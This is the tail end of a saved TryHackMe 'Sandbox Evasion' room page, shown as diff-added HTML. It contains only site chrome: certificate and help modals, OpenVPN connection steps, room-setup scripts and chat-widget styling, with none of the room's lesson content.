+<h5 class="bold">You're here incognito? It's ok!</h5>
+<p class="text-secondary">If you chose skip, your username will be used instead!</p>
+</div>
+</div>
+<div class="row">
+<div class="col-6">
+<button type="button" class="btn btn-success float-right" id="modal-cert-generate" onclick="gen_cert(true)" disabled="">
+Generate with my full name
+</button>
+</div>
+<div class="col-6">
+<button type="button" class="btn btn-primary float-right" id="modal-cert-skip" onclick="gen_cert(false)">
+Generate with my username
+</button>
+</div>
+</div>
+</div>
+</div>
+</div>
+</div>
+<script src="./TryHackMe _ Sandbox Evasion_files/certificateName.js"></script>
+<div class="modal fade slideout-faq" id="roomSlideoutUnstuck" tabindex="-1" role="dialog">
+<div class="modal-dialog modal-dialog-slideout" role="document">
+<div class="modal-content">
+<div class="modal-body">
+<div id="slideout-links">
+<div id="unstuck-video" class="unstuck-group" style="display: none;">
+<div class="unstuck-icon"><i class="fas fa-play"></i></div>
+<div class="unstuck-icon-text">Video Solution</div>
+</div>
+<div id="unstuck-writeups" class="unstuck-group" style="display: none;">
+<div class="unstuck-icon"><i class="fas fa-pen-alt"></i></div>
+<div class="unstuck-icon-text">Writeups</div>
+</div>
+<a id="unstuck-forum" target="_blank" class="clear-link unstuck-group" href="https://tryhackme.com/forum/thread/6274fb0afa16eb00604cef93">
+<div class="unstuck-icon"><i class="fas fa-comments-alt"></i></div>
+<div class="unstuck-icon-text">Forum Post</div>
+</a>
+<a href="https://help.tryhackme.com/en/collections/3601905-getting-started-with-tryhackme" target="_blank" class="clear-link unstuck-group">
+<div class="unstuck-icon"><i class="fas fa-books"></i></div>
+<div class="unstuck-icon-text">Knowledge Base</div>
+</a>
+<a href="https://discord.gg/DpBZz8y" target="_blank" class="clear-link unstuck-group">
+<div class="unstuck-icon"><i class="fas fa-users"></i></div>
+<div class="unstuck-icon-text">Ask Community</div>
+</a>
+</div>
+</div>
+</div>
+</div>
+</div>
+<style>
+
+    #navConnModal .modal-body{
+        position: relative;
+    }
+
+    #nav-openvpn,
+    #nav-attackbox {
+        display: none;
+    }
+
+    #nav-openvpn .nav-pills .nav-link.active,
+    #nav-openvpn .nav-pills .show>.nav-link {
+        background-color: #ec8e3d;
+        color: white;
+    }
+    #nav-openvpn .nav-link {
+        color: #909090;
+    }
+    #nav-openvpn a,
+    #nav-attackbox a {
+        color: #ec8e3d;
+    }
+
+    #nav-openvpn code.dark {
+        background-color: #7d400a;
+        color: #fff;
+    }
+
+    #slideout-bk {
+        display: none;
+        padding: 10px 15px;
+        opacity: 0.8;
+        cursor: pointer;
+    }
+
+    #slideout-bk:hover {
+        opacity: 1;
+    }
+
+    #slideout-conn-hideip {
+        display: none;
+        position: absolute;
+        bottom: 8px;
+        right: 8px;
+        opacity: 0.7;
+        cursor: pointer;
+    }
+
+    #slideout-conn-hideip:hover {
+        opacity: 1;
+    }
+
+</style>
+<div class="modal fade slideout-faq" id="navConnModal" tabindex="-1" role="dialog">
+<div class="modal-dialog modal-dialog-slideout" role="document">
+<div class="modal-content">
+<div class="modal-body">
+<div id="slideout-bk" class="noselect" onclick="showSlideoutConnOptions()"><i class="far fa-arrow-left mr-2"></i> Show Connection Options</div>
+<div id="slideout-conn-options">
+<div id="slideout-conn-header" class="text-center">
+<img class="slideout-connect-img" src="./TryHackMe _ Sandbox Evasion_files/tryhackme_connect.png">
+<div id="slideout-conn-status" class="size-22">You are <span class="text-danger">disconnected</span></div>
+</div>
+<div class="m-3 text-center">
+<p>To access target machines you need to either:</p>
+<div class="row mb-3 faq-quicklinks text-left vertical-align-custom">
+<div class="col-md-12 mb-3">
+<a class="clear-link preventDefault" href="https://tryhackme.com/room/sandboxevasion#" onclick="showAttackBoxSteps()">
+<div class="card card-body">
+<div class="row vertical-align-custom">
+<div class="col col-2 text-center faq-quicklinks-icons">
+<i class="far fa-laptop"></i>
+</div>
+<div class="col">
+<div class="faq-quicklinks-title size-18">AttackBox</div>
+<p class="faded mb-0">Use a browser-based attack machine</p>
+</div>
+</div>
+</div>
+</a>
+</div>
+<div class="col-md-12">
+<a class="clear-link preventDefault" href="https://tryhackme.com/room/sandboxevasion#" onclick="showVPNSteps()">
+<div class="card card-body">
+<div class="row vertical-align-custom">
+<div class="col col-2 text-center faq-quicklinks-icons">
+<i class="far fa-key"></i>
+</div>
+<div class="col">
+<div class="faq-quicklinks-title size-18">OpenVPN</div>
+<p class="faded mb-0">Connect to our network via a VPN</p>
+</div>
+</div>
+</div>
+</a>
+</div>
+</div>
+</div>
+</div>
+<div id="faqCards" class="p-3">
+<div id="nav-openvpn">
+<div class="mb-3">
+<a target="_blank" href="https://tryhackme.com/access"><i>View the dedicated OpenVPN access page for more information</i></a>
+</div>
+<div class="text-center">
+<h4>What Operating System are you using?</h4>
+<ul class="nav nav-pills mb-3 text-center" id="vpn-guide" style="display: flex; justify-content: center;">
+<li class="nav-item m-3">
+<a class="nav-link" data-toggle="pill" href="https://tryhackme.com/room/sandboxevasion#pills-windows" role="tab" aria-controls="pills-windows" aria-selected="true"><i class="fab fa-windows mr-2"></i> Windows</a>
+</li>
+<li class="nav-item m-3">
+<a class="nav-link active" data-toggle="pill" href="https://tryhackme.com/room/sandboxevasion#pills-linux" role="tab" aria-controls="pills-linux" aria-selected="false"><i class="fab fa-linux mr-2"></i> Linux</a>
+</li>
+<li class="nav-item m-3">
+<a class="nav-link" data-toggle="pill" href="https://tryhackme.com/room/sandboxevasion#pills-macos" role="tab" aria-controls="pills-macos" aria-selected="false"><i class="fab fa-apple mr-2"></i> MacOS</a>
+</li>
+</ul>
+<div class="tab-content text-left">
+<div class="tab-pane fade" id="pills-windows" role="tabpanel">
+<ol>
+<li><a href="https://tryhackme.com/vpn/get-config">Download</a> your OpenVPN configuration pack.</li>
+<li class="mt-2"><a target="_blank" href="https://openvpn.net/client-connect-vpn-for-windows/">Download</a> the OpenVPN GUI application.</li>
+<li class="mt-2">Install the OpenVPN GUI application. Then open the installer file and follow the setup wizard.</li>
+<li class="mt-2">Open and run the OpenVPN GUI application as Administrator.<br><img class="mt-2 mb-3" src="./TryHackMe _ Sandbox Evasion_files/win_ran_admin.png"></li>
+<li class="mt-2">The application will start running in the system tray. It's at the bottom of your screen, near the clock. Right click on the application and click <b>Import File</b>. <br><img class="mt-2 mb-3" src="./TryHackMe _ Sandbox Evasion_files/win_import.png"></li>
+<li class="mt-2">Select the configuration file you downloaded earlier.</li>
+<li class="mt-2">Now right click on the application again, select your file and click Connect <br><img class="mt-2 mb-3" src="./TryHackMe _ Sandbox Evasion_files/win_connect.png"></li>
+</ol>
+</div>
+<div class="tab-pane fade show active" id="pills-linux" role="tabpanel">
+<ol>
+<li><a href="https://tryhackme.com/vpn/get-config">Download</a> your OpenVPN configuration pack.</li>
+<li class="mt-2">Run the following command in your terminal: <code class="dark">sudo apt install openvpn</code></li>
+<li class="mt-2">Locate the full path to your VPN configuration file (normally in your ~/Downloads folder).</li>
+<li class="mt-2">Use your OpenVPN file with the following command: <code class="dark">sudo openvpn /path/to/file.ovpn</code></li>
+</ol>
+</div>
+<div class="tab-pane fade" id="pills-macos" role="tabpanel">
+<ol>
+<li><a href="https://tryhackme.com/vpn/get-config">Download</a> your OpenVPN configuration pack.</li>
+<li class="mt-2"><a href="https://openvpn.net/downloads/openvpn-connect-v2-macos.dmg">Download</a> OpenVPN for MacOS.</li>
+<li class="mt-2">Install the OpenVPN GUI application, by opening the dmg file and following the setup wizard.<br><img width="250" class="mt-2 mb-3" src="./TryHackMe _ Sandbox Evasion_files/mac_installer.png"></li>
+<li class="mt-2">Open and run the OpenVPN GUI application.</li>
+<li class="mt-2">The application will start running and appear in your top bar. Right click on the application and click <b>Import File -&gt; Local file</b>.<br><img class="mt-2 mb-3" src="./TryHackMe _ Sandbox Evasion_files/mac_import.png"></li>
+<li class="mt-2">Select the configuration file you downloaded earlier.</li>
+<li class="mt-2">Right click on the application again, select your file and click connect.<br><img class="mt-2 mb-3" src="./TryHackMe _ Sandbox Evasion_files/mac_connect.png"></li>
+</ol>
+</div>
+</div>
+<section class="text-left">
+<a class="remove-underline" data-toggle="collapse" href="https://tryhackme.com/room/sandboxevasion#havingProblems" role="button" aria-expanded="false" aria-controls="havingProblems">
+<h5 class="mb-0 text-openvpn">Having Problems?</h5>
+</a>
+<div class="collapse" id="havingProblems">
+<ul class="mt-2 mb-0">
+<li>If you can access <a target="_blank" href="http://10.10.10.10/">10.10.10.10</a>, you're connected.</li>
+<li>Downloading and getting a 404? Go the <a href="https://tryhackme.com/access">access</a> page and switch VPN servers.</li>
+<li>Getting inline cert error? Go the <a href="https://tryhackme.com/access">access</a> page and switch VPN servers.</li>
+<li>If you are using a virtual machine, you will need to run the VPN inside that machine.</li>
+<li>Is the OpenVPN client running as root? <span class="size-14 faded">(On Windows, run OpenVPN GUI as administrator. On Linux, run with sudo)</span></li>
+<li>Have you restarted your VM?</li>
+<li>Is your OpenVPN up-to-date?</li>
+<li>Only 1 OpenVPN connection is allowed. <span class="size-14 faded">(Run <code class="dark">ps aux | grep openvpn</code> - are there 2 VPN sessions running?)</span></li>
+<li>Still having issues? Check our <a href="https://help.tryhackme.com/en/articles/6496029-openvpn-general-troubleshooting-detailed/">docs</a> out.</li>
+</ul>
+</div>
+</section>
+</div>
+</div>
+<div id="nav-attackbox">
+<div class="text-center">
+<h4>AttackBox</h4>
+<p class="faded">Use your own web-based linux machine to access machines on TryHackMe</p>
+</div>
+<p>To start your AttackBox in the room, click the <a class="preventDefault" onclick="showAttackBoxBtnFromSlideout()" href="https://tryhackme.com/room/sandboxevasion#">Start AttackBox</a> button. Your private machine will take 2 minutes to start.</p>
+<p>Free users get 1 free AttackBox hour. <a class="hacker-green" href="https://tryhackme.com/why-subscribe">Subscribed</a> users get more powerful machines with unlimited deploys.</p>
+</div>
+</div>
+<span id="slideout-conn-hideip" onclick="hideNavConnIP()" style="display: none;">Hide IP</span>
+</div>
+</div>
+</div>
+</div>
+<script>
+
+    const navConnVPNEl = document.querySelector('#nav-openvpn')
+    const navConnAttackBoxEl = document.querySelector('#nav-attackbox')
+    const navConnOptions = document.querySelector('#slideout-conn-options')
+
+    const navConnBkBtn = document.querySelector('#slideout-bk')
+
+    function showVPNSteps() {
+        navConnOptions.style.display = 'none'
+        navConnVPNEl.style.display = 'block'
+        navConnBkBtn.style.display = 'block'
+    }
+
+    function showAttackBoxSteps() {
+        navConnOptions.style.display = 'none'
+        navConnAttackBoxEl.style.display = 'block'
+        navConnBkBtn.style.display = 'block'
+    }
+
+    function showSlideoutConnOptions() {
+        navConnVPNEl.style.display = 'none'
+        navConnAttackBoxEl.style.display = 'none'
+        navConnBkBtn.style.display = 'none'
+        navConnOptions.style.display = 'block'
+    }
+
+    function showAttackBoxBtnFromSlideout() {
+        $('#navConnModal').modal('toggle')
+        setTimeout(function() {
+            showAttackBoxBtnIntro()
+        }, 100)   
+    }
+
+  </script>
+</div><iframe id="_hjSafeContext_53683235" title="_hjSafeContext" tabindex="-1" aria-hidden="true" src="./TryHackMe _ Sandbox Evasion_files/saved_resource.html" style="display: none !important; width: 1px !important; height: 1px !important; opacity: 0 !important; pointer-events: none !important;"></iframe>
+<script src="./TryHackMe _ Sandbox Evasion_files/notify.js"></script>
+<script src="./TryHackMe _ Sandbox Evasion_files/api-requests.js"></script>
+<script src="./TryHackMe _ Sandbox Evasion_files/events.js"></script>
+<script src="./TryHackMe _ Sandbox Evasion_files/underscore-min.js"></script>
+<script src="./TryHackMe _ Sandbox Evasion_files/apexcharts.min.js"></script> 
+<script src="./TryHackMe _ Sandbox Evasion_files/chart.js"></script>
+<script src="./TryHackMe _ Sandbox Evasion_files/expire.js"></script>
+<script src="./TryHackMe _ Sandbox Evasion_files/sockets.js"></script>
+<script src="./TryHackMe _ Sandbox Evasion_files/faqSearch.js"></script>
+<script src="./TryHackMe _ Sandbox Evasion_files/certificate.js"></script>
+<script src="./TryHackMe _ Sandbox Evasion_files/utils.js"></script>
+<script src="./TryHackMe _ Sandbox Evasion_files/roomSpecific.js"></script>
+<script src="./TryHackMe _ Sandbox Evasion_files/confetti.js"></script>
+<script src="./TryHackMe _ Sandbox Evasion_files/videos.js"></script>
+<script src="./TryHackMe _ Sandbox Evasion_files/intro.js"></script>
+<script src="./TryHackMe _ Sandbox Evasion_files/prism.js"></script>
+<script src="./TryHackMe _ Sandbox Evasion_files/asciinema-player.js"></script>
+<script src="./TryHackMe _ Sandbox Evasion_files/magnific-popup.min.js"></script>
+<script src="./TryHackMe _ Sandbox Evasion_files/introjsLogic.js"></script>
+<script src="./TryHackMe _ Sandbox Evasion_files/logic.js"></script>
+<script src="./TryHackMe _ Sandbox Evasion_files/tasks.js"></script>
+<script src="./TryHackMe _ Sandbox Evasion_files/connection-status.js"></script>
+<script src="./TryHackMe _ Sandbox Evasion_files/glossary.js"></script>
+<script src="./TryHackMe _ Sandbox Evasion_files/room-mymachine.js"></script>
+<script src="./TryHackMe _ Sandbox Evasion_files/heartbeat.js" defer=""></script>
+<script>
+
+    let height
+    $(window).scroll(function () { /* Function to make IP information sticky. */
+      if (height == undefined || height < 30) {
+        height = ($('#instance-info').offset().top)
+      }
+      let scroll = $(window).scrollTop()
+      if (((scroll >= (height + 150))) && height > 30) {
+        $("#instance-info").addClass('instance-sticky')
+      } else if ((scroll <= (height))) {
+        $("#instance-info").removeClass("instance-sticky")
+      }
+    })
+
+    const csrfToken = "QbvgWhMd-59d-y4B6IMEs86a_gYXd72QUJYY"
+    $.ajaxSetup({ headers: { 'CSRF-Token': csrfToken } }) // all $.post headers include token (needs csrfProtection middleware)
+
+    const roomCode = "sandboxevasion"
+    const simpleRoom = true 
+    const events = {"tickets":false}
+
+    let userObj = { 
+      subscribed: 1,
+      splitScreen: true,
+      path: "redteaming",
+      tutorial: {
+        rooms: true,
+        attackbox: true,
+        staticsite: true
+      },
+      experiments:  JSON.parse(`{"onboardingAchievement":{},"scheduler":{"startDate":"2023-06-14T13:38:51.108Z"},"showEasyPath":true}`),
+    }
+
+    const roomSettings = {
+      remAttackBoxBtn : false
+    };
+
+    const heartbeatInterval = 30;
+
+    const cloudEnabled = false 
+    let cloudObj
+
+    initRoom()
+    checkVideoTab()
+    if(!simpleRoom) showChart(roomCode)
+
+    checkRoomAwards(roomCode)
+
+    getRoomVotes()
+
+    displayStreakFreezeAwardedFromMemory();
+    
+    window.addEventListener('load', function () {
+      introjsInit(roomCode)
+    })
+
+  </script>
+
+
+<svg id="SvgjsSvg1001" width="2" height="0" xmlns="http://www.w3.org/2000/svg" version="1.1" xmlns:xlink="http://www.w3.org/1999/xlink" xmlns:svgjs="http://svgjs.dev" style="overflow: hidden; top: -100%; left: -100%; position: absolute; opacity: 0;"><defs id="SvgjsDefs1002"></defs><polyline id="SvgjsPolyline1003" points="0,0"></polyline><path id="SvgjsPath1004" d="M0 0 "></path></svg><div id="51E5AF7B-89BA-240F-F026-992CF0320A59"></div><iframe id="intercom-frame" style="position: absolute !important; opacity: 0 !important; width: 1px !important; height: 1px !important; top: 0 !important; left: 0 !important; border: none !important; display: block !important; z-index: -1 !important; pointer-events: none;" aria-hidden="true" tabindex="-1" title="Intercom" src="./TryHackMe _ Sandbox Evasion_files/saved_resource(1).html"></iframe><div class="intercom-lightweight-app"><div class="intercom-lightweight-app-launcher intercom-launcher" role="button" tabindex="0" aria-label="Open Intercom Messenger" aria-live="polite"><div class="intercom-lightweight-app-launcher-icon intercom-lightweight-app-launcher-icon-open"><img src="./TryHackMe _ Sandbox Evasion_files/9e0f012f15b6fc981dde2f1f5198d728.png" alt="" class="intercom-lightweight-app-launcher-custom-icon-open"></div><div class="intercom-lightweight-app-launcher-icon intercom-lightweight-app-launcher-icon-minimize"><svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+  <path fill-rule="evenodd" clip-rule="evenodd" d="M18.601 8.39897C18.269 8.06702 17.7309 8.06702 17.3989 8.39897L12 13.7979L6.60099 8.39897C6.26904 8.06702 5.73086 8.06702 5.39891 8.39897C5.06696 8.73091 5.06696 9.2691 5.39891 9.60105L11.3989 15.601C11.7309 15.933 12.269 15.933 12.601 15.601L18.601 9.60105C18.9329 9.2691 18.9329 8.73091 18.601 8.39897Z" fill="white"></path>
+</svg>
+</div></div><style id="intercom-lightweight-app-style" type="text/css">
+  @keyframes intercom-lightweight-app-launcher {
+    from {
+      opacity: 0;
+      transform: scale(0.5);
+    }
+    to {
+      opacity: 1;
+      transform: scale(1);
+    }
+  }
+
+  @keyframes intercom-lightweight-app-gradient {
+    from {
+      opacity: 0;
+    }
+    to {
+      opacity: 1;
+    }
+  }
+
+  @keyframes intercom-lightweight-app-messenger {
+    0% {
+      opacity: 0;
+      transform: scale(0);
+    }
+    40% {
+      opacity: 1;
+    }
+    100% {
+      transform: scale(1);
+    }
+  }
+
+  .intercom-lightweight-app {
+    position: fixed;
+    z-index: 2147483001;
+    width: 0;
+    height: 0;
+    font-family: intercom-font, "Helvetica Neue", "Apple Color Emoji", Helvetica, Arial, sans-serif;
+  }
+
+  .intercom-lightweight-app-gradient {
+    position: fixed;
+    z-index: 2147483002;
+    width: 500px;
+    height: 500px;
+    bottom: 0;
+    right: 0;
+    pointer-events: none;
+    background: radial-gradient(
+      ellipse at bottom right,
+      rgba(29, 39, 54, 0.16) 0%,
+      rgba(29, 39, 54, 0) 72%);
+    animation: intercom-lightweight-app-gradient 200ms ease-out;
+  }
+
+  .intercom-lightweight-app-launcher {
+    position: fixed;
+    z-index: 2147483003;
+    padding: 0 !important;
+    margin: 0 !important;
+    border: none;
+    bottom: 20px;
+    right: 20px;
+    max-width: 48px;
+    width: 48px;
+    max-height: 48px;
+    height: 48px;
+    border-radius: 50%;
+    background: #1C2538;
+    cursor: pointer;
+    box-shadow: 0 1px 6px 0 rgba(0, 0, 0, 0.06), 0 2px 32px 0 rgba(0, 0, 0, 0.16);
+    transition: transform 167ms cubic-bezier(0.33, 0.00, 0.00, 1.00);
+    box-sizing: content-box;
+  }
+
+
+  .intercom-lightweight-app-launcher:hover {
+    transition: transform 250ms cubic-bezier(0.33, 0.00, 0.00, 1.00);
+    transform: scale(1.1)
+  }
+
+  .intercom-lightweight-app-launcher:active {
+    transform: scale(0.85);
+    transition: transform 134ms cubic-bezier(0.45, 0, 0.2, 1);
+  }
+
+
+  .intercom-lightweight-app-launcher:focus {
+    outline: none;
+
+    
+  }
+
+  .intercom-lightweight-app-launcher-icon {
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    position: absolute;
+    top: 0;
+    left: 0;
+    width: 48px;
+    height: 48px;
+    transition: transform 100ms linear, opacity 80ms linear;
+  }
+
+  .intercom-lightweight-app-launcher-icon-open {
+    
+        opacity: 1;
+        transform: rotate(0deg) scale(1);
+      
+  }
+
+  .intercom-lightweight-app-launcher-icon-open svg {
+    width: 24px;
+    height: 24px;
+  }
+
+  .intercom-lightweight-app-launcher-icon-open svg path {
+    fill: rgb(255, 255, 255);
+  }
+
+  .intercom-lightweight-app-launcher-icon-self-serve {
+    
+        opacity: 1;
+        transform: rotate(0deg) scale(1);
+      
+  }
+
+  .intercom-lightweight-app-launcher-icon-self-serve svg {
+    height: 44px;
+  }
+
+  .intercom-lightweight-app-launcher-icon-self-serve svg path {
+    fill: rgb(255, 255, 255);
+  }
+
+  .intercom-lightweight-app-launcher-custom-icon-open {
+    max-height: 24px;
+    max-width: 24px;
+
+    
+        opacity: 1;
+        transform: rotate(0deg) scale(1);
+      
+  }
+
+  .intercom-lightweight-app-launcher-icon-minimize {
+    
+        opacity: 0;
+        transform: rotate(-60deg) scale(0);
+      
+  }
+
+  .intercom-lightweight-app-launcher-icon-minimize svg path {
+    fill: rgb(255, 255, 255);
+  }
+
+  .intercom-lightweight-app-messenger {
+    position: fixed;
+    z-index: 2147483003;
+    overflow: hidden;
+    background-color: white;
+    animation: intercom-lightweight-app-messenger 250ms cubic-bezier(0, 1, 1, 1);
+    transform-origin: bottom right;
+    
+        width: 400px;
+        height: calc(100% - 104px);
+        max-height: 704px;
+        min-height: 250px;
+        right: 20px;
+        bottom: 84px;
+        box-shadow: 0 5px 40px rgba(0,0,0,0.16);
+      
+
+    border-radius: 16px;
+  }
+
+  .intercom-lightweight-app-messenger-header {
+    height: 64px;
+    border-bottom: none;
+    background: #1c2538
+
+    
+  }
+
+  .intercom-lightweight-app-messenger-footer{
+    position:absolute;
+    bottom:0;
+    width: 100%;
+    height: 80px;
+    background: #fff;
+    font-size: 14px;
+    line-height: 21px;
+    border-top: 1px solid rgba(0, 0, 0, 0.05);
+    box-shadow: 0px 0px 25px rgba(0, 0, 0, 0.05);
+    
+  }
+
+  @media print {
+    .intercom-lightweight-app {
+      display: none;
+    }
+  }
+</style></div></body></html>
